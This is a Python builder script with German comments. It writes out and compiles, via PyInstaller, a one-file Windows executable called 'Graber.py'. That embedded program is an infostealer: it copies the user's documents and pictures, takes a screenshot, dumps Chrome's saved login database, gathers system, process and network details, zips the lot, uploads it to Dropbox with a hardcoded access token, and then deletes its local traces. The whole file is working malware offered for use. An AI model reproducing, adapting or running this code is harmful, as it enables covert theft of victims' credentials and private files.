import subprocess
import os
import sys

def create_file():
    """
    Creates a text file with a predefined filename and content.
    Then tries to compile it to a single exe without console using PyInstaller.

    Returns:
        tuple: (success: bool, message: str)
    """
    filename = "Graber.py"
    content = r'''import pynput
import platform
import psutil
from PIL import ImageGrab
import sqlite3
import cpuinfo
import socket
import subprocess
import sys
import os
import shutil
import datetime
import threading
import zipfile
import dropbox
import multiprocessing

def main():
    base_dir = os.path.expanduser(r"~\G_LoggerExport")
    os.makedirs(base_dir, exist_ok=True)

    logfile = os.path.join(base_dir, "log.txt")
    def log(msg):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(logfile, "a", encoding="utf-8") as lf:
            lf.write(f"[{timestamp}] {msg}\n")
        print(msg)

    log("Script gestartet.")

    # Dokumente kopieren
    doc_dir = os.path.join(base_dir, "Dokumente")
    os.makedirs(doc_dir, exist_ok=True)
    source_doc = os.path.expanduser(r"~\Documents")
    for root, dirs, files in os.walk(source_doc):
        for file in files:
            if file.lower().endswith((".docx", ".pdf", ".txt")):
                try:
                    shutil.copy(os.path.join(root, file), doc_dir)
                except (IOError, OSError):
                    pass
    log("Dokumente kopiert.")

    # Bilder kopieren
    img_dir = os.path.join(base_dir, "Bilder")
    os.makedirs(img_dir, exist_ok=True)
    source_img = os.path.expanduser(r"~\Pictures")
    for root, dirs, files in os.walk(source_img):
        for file in files:
            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                try:
                    shutil.copy(os.path.join(root, file), img_dir)
                except (IOError, OSError):
                    pass
    log("Bilder kopiert.")

    # Screenshot machen
    try:
        screenshot_dir = os.path.join(base_dir, "Screenshots")
        os.makedirs(screenshot_dir, exist_ok=True)
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(screenshot_dir, "screenshot.png"))
        log("Screenshot erstellt.")
    except Exception as e:
        log(f"Fehler beim Erstellen des Screenshots: {e}")

    # Chrome-Passwörter extrahieren (nur unverschlüsselte Darstellung!)
    pw_dir = os.path.join(base_dir, "Passwoerter")
    os.makedirs(pw_dir, exist_ok=True)
    chrome_profile = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    if os.path.exists(chrome_profile):
        temp_db = os.path.join(pw_dir, "LoginDataTemp.db")
        try:
            shutil.copy(chrome_profile, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(os.path.join(pw_dir, "chrome_passwoerter.txt"), "w", encoding="utf-8") as f:
                for row in cursor.fetchall():
                    f.write(f"{row}\n")
            conn.close()
            log("Chrome-Passwörter extrahiert.")
        except Exception as e:
            log(f"Fehler beim Auslesen der Passwörter: {e}")
        finally:
            if 'temp_db' in locals() and os.path.exists(temp_db):
                os.remove(temp_db)
    else:
        log("Chrome-Login-DB nicht gefunden.")

    # Systeminformationen sammeln
    sysinfo_dir = os.path.join(base_dir, "Systeminformationen")
    os.makedirs(sysinfo_dir, exist_ok=True)

    # Hardware- und OS-Infos
    def get_cpu_brand():
        result = {'value': None}
        def target():
            try:
                result['value'] = cpuinfo.get_cpu_info()['brand_raw']
            except Exception:
                result['value'] = None
        t = threading.Thread(target=target)
        t.start()
        t.join(timeout=3)
        if t.is_alive() or result['value'] is None:
            try:
                return platform.processor() or "unbekannt"
            except Exception:
                return "unbekannt"
        return result['value']

    try:
        with open(os.path.join(sysinfo_dir, "hardware_os.txt"), "w", encoding="utf-8") as f:
            f.write(f"Betriebssystem: {platform.system()} {platform.release()} {platform.version()}\n")
            f.write(f"Architektur: {platform.machine()}\n")
            f.write(f"Hostname: {platform.node()}\n")
            cpu_brand = get_cpu_brand()
            f.write(f"CPU: {cpu_brand}\n")
            f.write(f"CPU-Kerne (physisch): {psutil.cpu_count(logical=False)}\n")
            f.write(f"CPU-Threads (logisch): {psutil.cpu_count(logical=True)}\n")
            ram = psutil.virtual_memory()
            f.write(f"RAM total: {ram.total/1024/1024:.2f} MB\n")
            f.write(f"RAM frei: {ram.available/1024/1024:.2f} MB\n")
        log("Hardware- und OS-Infos gespeichert.")
    except Exception as e:
        log(f"Fehler beim Speichern der Hardware-Infos: {e}")

    # Laufende Prozesse
    try:
        with open(os.path.join(sysinfo_dir, "prozesse.txt"), "w", encoding="utf-8") as f:
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    f.write(f"{proc.info}\n")
                except Exception:
                    continue
        log("Prozesse gespeichert.")
    except Exception as e:
        log(f"Fehler beim Speichern der Prozesse: {e}")

    # Netzwerkverbindungen und IP-Adressen
    try:
        with open(os.path.join(sysinfo_dir, "netzwerk.txt"), "w", encoding="utf-8") as f:
            f.write("Aktive Netzwerkverbindungen:\n")
            for conn in psutil.net_connections():
                f.write(f"{conn}\n")
            f.write("\nIP-Adressen:\n")
            hostname = socket.gethostname()
            try:
                ip = socket.gethostbyname(hostname)
                f.write(f"{hostname}: {ip}\n")
            except Exception:
                pass
        log("Netzwerkdaten gespeichert.")
    except Exception as e:
        log(f"Fehler beim Speichern der Netzwerkdaten: {e}")

    # Installierte Programme (Windows)
    with open(os.path.join(sysinfo_dir, "installierte_programme.txt"), "w", encoding="utf-8") as f:
        try:
            result = subprocess.check_output(
                r'reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s', shell=True, text=True, errors='ignore'
            )
            f.write(result)
            log("Installierte Programme gespeichert.")
        except Exception as e:
            f.write(f"Fehler beim Auslesen: {e}\n")
            log(f"Fehler beim Auslesen installierter Programme: {e}")

    log("Fertig. Alles gespeichert in " + base_dir)

    # Export-Ordner als ZIP-Datei komprimieren
    try:
        zip_path = base_dir + ".zip"
        def zipdir(path, ziph):
            for root, dirs, files in os.walk(path):
                for file in files:
                    abs_path = os.path.join(root, file)
                    rel_path = os.path.relpath(abs_path, os.path.dirname(base_dir))
                    ziph.write(abs_path, rel_path)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipdir(base_dir, zipf)
        log(f"ZIP-Archiv erstellt: {zip_path}")
    except Exception as e:
        log(f"Fehler beim Erstellen des ZIP-Archivs: {e}")
        sys.exit(1)


    # --- Dropbox-Upload der ZIP-Datei ---
    DROPBOX_ACCESS_TOKEN = "sl.u.AGGw9cTXIXVEeR1KsAm7MwWhnQ1PJYOVX1KokZx687YpfOM8A9dZXoShw-teTuz4Zx6HUCNV4h7JZ7ZDACzWAW2EukFakzSuz4LWpE0nZMajtN21e4QhRIQ8Rno9_pQSFIA0FtzadzG000BTt93Fc89ljelfM9WHCWhGrJ223LYCXxZZQGJUt05-KHBnw8huPUFtobNrYyHCe1e52D1EdBs7Ft_h1RsxlSAth4jLpQ362Apz54ntNgajJLfgQtAXHtk0CligXizXvjbOlsds_GUaq8Yo-FX1gNHK4ktW0giI7caH51ZJsPAF_cDAfhyCxgcHj-iPMrJOvcRWGfmPz9ImaDDtE_AhWKSDLSZ8i3fW2guXlVAokhB2cT5epndD7OzZFWRHrYSdn-U7beWHr0pj-UJpw5J5yY-vs0y0BOsQN3dtNs3ILzIl7l4Vn4hswdXacmUjyGoj-5RrQTYgCIL_RUKgWB2XYt54rzq2k3ICp5-xMrORAunJ-TFVH1BfSnCurjrQ0P3n-LX8E5FWvBriLwtNCBHfxrAslO-qxLjI-WqctzIrMVu0cMvOsfLObJHycruKmT8Quae5TX_EB0wSRNwG9KiFuiVvr3WNATrz3XrmGNzAHgr3NMAbzHxHR8yNR0Kj4lMd-l8a7XP_u2SgBDpyaTu8SfytDBQin5Um3POeSVm_OAQqScqtvXXGJufcfzE3yKqhamvq35hXv2TL5BB6xvkcWotLAKZqsVGpEcRF73GCz-DAb_Vht-QxIplM4wfyqKApu1KYh65w0Elypt9ZWrdpG2ysUJ9hhyDZE2478Dts8nDlNhx9jGIR-fVXN3egaqQdje6E6uZn2NYYi5K10_p99SLRiOYFTT5jrqQ4StG19TdwzgFb5E0IteAFlMgO6g6EUsxQi_Nz8Cz0Bk32TE1jiazN1FgRBlWo75pVAnsghgchvXo4wuOTQHss-eVk_G-QEmQL9azSgt_y_OUesFcKt89d4DZmwG1xF0XqjHtmltYuQgdTT79XX5D7xyrT7uYwuRTv7WaW17a6iSMYW1CMoOZQJ9BNml-3XH9rBGvsGtCb3K4_9pdvlvSSvrnXjzglorS9kdpZbYBfD0sBqd6MhnbG5cFDjJ2cvouQn_fX5CIlqeVXyfuHIhYs83nytakE2KVKE58YBrMHpfgYLQ7Mp6ATyJ6_GlN6hFAuKI67Cwp-yTTGuoMJN7nM1qTIr6k0soZiN_-p1KslFqty1oW-0lmGONdvOF_GU3yeFV-PUbvrIyAYILcKjGDT7Nez4YpRCQUVMvBsoFIKcYesND4ORGt4NmrfeMZD3creyQXfZgPHjbUnESaLJmrAUUy8kdkDBeTqDmGK-Kdhnr9-4-wYUPSoRXTxPsDbZBwIxF15asC8GpRCdgkw1xuEdD6UU_3pL03avGuwGC_QFLswO1eHza78-nnCVJUqiw"

    if DROPBOX_ACCESS_TOKEN != "HIER_ACCESS_TOKEN_EINFUEGEN":
        try:
            if len(DROPBOX_ACCESS_TOKEN) < 20:
                raise ValueError("Der Dropbox-Access-Token ist zu kurz oder ungültig. Bitte prüfe den Token.")
            dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
            timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
            unique_filename = f"/G_LoggerExport_{timestamp}.zip"
            with open(zip_path, "rb") as f:
                dbx.files_upload(f.read(), unique_filename)
            log(f"ZIP-Datei wurde als '{unique_filename}' zu Dropbox hochgeladen. ✅")
            log("Erfolg! Die Datei befindet sich jetzt in deinem Dropbox-Hauptverzeichnis.")
            # Nach Erfolg: Aufräumarbeiten direkt hier durchführen
            folder_path = os.path.expanduser(r"~\G_LoggerExport")
            if os.path.exists(folder_path):
                shutil.rmtree(folder_path)
                log(f"Ordner '{folder_path}' wurde gelöscht.")
            zip_path_abs = folder_path + ".zip"
            if os.path.exists(zip_path_abs):
                os.remove(zip_path_abs)
                log(f"Datei '{zip_path_abs}' wurde gelöscht.")
        except Exception as e:
            log(f"Fehler beim Upload zu Dropbox: {e}")
            sys.exit(1)
    else:
        log("Kein Dropbox-Access-Token gesetzt. Bitte in der Variable DROPBOX_ACCESS_TOKEN eintragen.")

    log("Programm ENDE. Beende jetzt mit sys.exit(0)")
    sys.exit(0)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
'''

    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"File '{filename}' created successfully. Attempting to compile with PyInstaller...")

        # PyInstaller unsichtbares Fenster unter Windows vermeiden
        startupinfo = None
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        # Prüfen ob pyinstaller installiert ist
        try:
            subprocess.run(["pyinstaller", "--version", "--noconsole"], check=True, capture_output=True, text=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            return True, f"File '{filename}' created. PyInstaller nicht gefunden. Bitte mit 'pip install pyinstaller' installieren."

        # PyInstaller Befehl ausführen
        command = ["pyinstaller", "--onefile", "--hidden-import=dropbox", filename]
        process = subprocess.run(command, check=True, capture_output=True, text=True, startupinfo=startupinfo)
        print("PyInstaller output:")
        print(process.stdout)
        if process.stderr:
            print("PyInstaller errors/warnings:")
            print(process.stderr)

        return True, f"File '{filename}' erstellt und erfolgreich in ausführbare Datei kompiliert."
    except IOError as e:
        return False, f"Fehler beim Erstellen der Datei: {e}"
    except subprocess.CalledProcessError as e:
        return False, f"Fehler bei PyInstaller: {e}\nStdout: {e.stdout}\nStderr: {e.stderr}"

# Beispiel-Aufruf
if __name__ == "__main__":
    success, message = create_file()
    print(message)